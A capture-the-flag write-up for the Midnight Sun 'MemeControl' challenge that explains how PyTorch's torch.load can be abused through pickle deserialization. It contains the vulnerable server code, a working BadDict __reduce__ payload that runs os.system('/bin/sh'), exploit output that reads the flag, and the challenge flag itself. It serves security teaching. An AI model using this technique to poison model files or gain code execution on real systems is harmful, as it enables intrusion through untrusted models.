# MemeControl
#### Category: pwn

Description:
> Author: hfs
> TODO:
>
>
> flag: midnight{backd00r5_ar3_c00l_wh3n_th3Y_ar3_yoUR5}

**Tags:** Python, PyTorch, Pickle Deserialization, Midnight Sun CTF

## Takeaways

Importing/Loading wild ML models can result in arbitrary code execution.

## Challenge

In this challenge we are given a piece of python code that expects a base64 encoded ML model, loads it, and set it in evaluation mode. The evaluation in itself is not that interesting, but, PyTorch is well known to be insecure when loading a model from the wilderness.

As stated in the [documentation](https://pytorch.org/docs/stable/generated/torch.load.html#torch.load):


> **Warning**:
> `torch.load()` unless *weights_only* parameter is set to *True*, uses `pickle module` implicitly, which is known to be insecure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never load data that could have come from an untrusted source in an unsafe mode, or that could have been tampered with. **Only load data you trust**

We can immediately recognize that the program is vulnerable to such an attack. In order to get remote code execution we just need to pop a shell during the unpickling. Perhaps by crafting it so that it executes `os.system('/bin/sh')`.

```python
import io
import torch
import base64

banner = \
'''
8""8""8                   8""""8                                      
8  8  8 eeee eeeeeee eeee 8    " eeeee eeeee eeeee eeeee  eeeee e     
8e 8  8 8    8  8  8 8    8e     8  88 8   8   8   8   8  8  88 8     
88 8  8 8eee 8e 8  8 8eee 88     8   8 8e  8   8e  8eee8e 8   8 8e    
88 8  8 88   88 8  8 88   88   e 8   8 88  8   88  88   8 8   8 88    
88 8  8 88ee 88 8  8 88ee 88eee8 8eee8 88  8   88  88   8 8eee8 88eee 
'''

try: 
    print(banner)
    base64_string = input("Send the base64 encoded model: ")
    bytes_data = base64.b64decode(base64_string)

    print("Evaluating the model ...")
    device = torch.device("cpu")
    model = torch.load(io.BytesIO(bytes_data), map_location=device)
    model.eval()
    print("Finished evaluating the model!")
except Exception as e:
    print(f"Ooops, this model is no good: {e}".format(e))
```

## Solution
Credits where they are due, we built our approach on the [patch-torch-save](https://github.com/yk/patch-torch-save) repo from `yk` that shows how to *poison* an existing model.

A model in itself is simply a dictionary, since we want to limit our payload as much as possible, and the actual usability of the model is of no concern. We define our model an plain dictionary. But an attacker could always use a legit large model. 

```python
super_ml_model: dict = {
    "Z":"T",
    "0":"T"
}
```

We define a `dict` subclass with a custom `__reduce__` function which will be called when the dict object will be pickled by `torch.save()`. 

`__reduce__` takes as a parameter a callable object that will be called to create the initial version of the object. In our case, we chose to simply use `exec` to execute any arbitrary code. Since there are no checks, our malicious code is as simple as it gets, the good ol' `os.system('/bin/sh')`.


```python
class BadDict(dict):

    def __init__(self, inject_src: str, **kwargs):
        super().__init__(**kwargs)
        self._inject_src = inject_src

    def __reduce__(self):
        return exec, (f'''{self._inject_src}''',), None, None, iter(self.items())

malicious_code = \
"""
import os
print("Hello from the other side! Popping a shell...")
os.system('/bin/sh')
"""

malicious_dict = BadDict(malicious_code, **super_ml_model)
torch.save(malicious_dict, "memecontrol.pth")
```

And we are all set! Now when the model will be unpickled by `torch.load()`, the malicious code will be executed. And we can simply cat the flag file.

```python
In [1]: import torch
In [2]: torch.load('./memecontrol.pth')
Hello from the other side! Popping a shell...
$ cat flag
midnight{backd00r5_ar3_c00l_wh3n_th3Y_ar3_yoUR5}
```

## Final Exploit
`exploit.py` uses pwntools to automate the exploit both locally and remotely. Assuming you have all the required packages, you can test the exploit locally with:
```bash
$ python3 exploit.py LOCAL

[*] Exporting malicious model. Code to be executed:
    import os
    print("Hello from the other side! Popping a shell...")
    os.system('/bin/sh')
[+] Starting local process '/home/ctfbox/.pyenv/shims/python3': pid 39565
...
Send the base64 encoded model: 
[*] Pushing payload: UEsDBAAACAgAAAAAAAAAAAAAAAAAAAAA...
[+] Evaluating the model ...
    Hello from the other side! Popping a shell...
[*] Switching to interactive mode
$ cat flag
midnight{backd00r5_ar3_c00l_wh3n_th3Y_ar3_yoUR5}
```


